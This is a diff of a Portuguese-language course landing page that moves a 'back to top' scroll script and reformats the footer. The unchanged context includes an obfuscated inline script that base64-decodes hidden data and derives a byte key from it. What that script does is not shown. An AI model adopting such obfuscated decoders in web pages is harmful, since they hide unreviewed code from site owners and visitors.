@@ -20,17 +20,6 @@
     <!-- ================= SCRIPT ================= -->
 
     <script>
-    document.querySelector('.voltar-topo').addEventListener('click', function(e) {
-        e.preventDefault();
-
-        window.scrollTo({
-            top: 0,
-            behavior: 'smooth'
-        });
-    });
-</script>
-
-    <script>
         (function () {
 
             var f_mohn = atob(
@@ -44,9 +33,11 @@
                 u_jf1 < f_mohn.length;
                 u_jf1++
             ) {
+
                 a_55.push(
                     f_mohn.charCodeAt(u_jf1) & 255
                 );
+
             }
 
             var s_9qz7 = a_55[0];
@@ -411,23 +402,46 @@
 
     <!-- ================= FOOTER ================= -->
 
-<footer>
+    <footer>
 
-    <div class="footer-content">
+        <div class="footer-content">
 
-        <div class="footer-logo">
-            Axion<span>Corp</span>
+            <div class="footer-logo">
+                Axion<span>Corp</span>
+            </div>
+
+            <a href="#" class="voltar-topo">
+                Voltar ao topo ↑
+            </a>
+
         </div>
 
-        <a href="#" class="voltar-topo">Volte ao topo ↑</a>
+        <p>
+            Inglês sem Travar na Viagem © 2026
+        </p>
 
-    </div>
+    </footer>
 
-    <p>
-        Inglês sem Travar na Viagem © 2026
-    </p>
 
-</footer>
+    <!-- ================= VOLTAR AO TOPO ================= -->
+
+    <script>
+
+        document
+            .querySelector('.voltar-topo')
+            .addEventListener('click', function(e) {
+
+                e.preventDefault();
+
+                window.scrollTo({
+                    top: 0,
+                    behavior: 'smooth'
+                });
+
+            });
+
+    </script>
+
 
 </body>
 
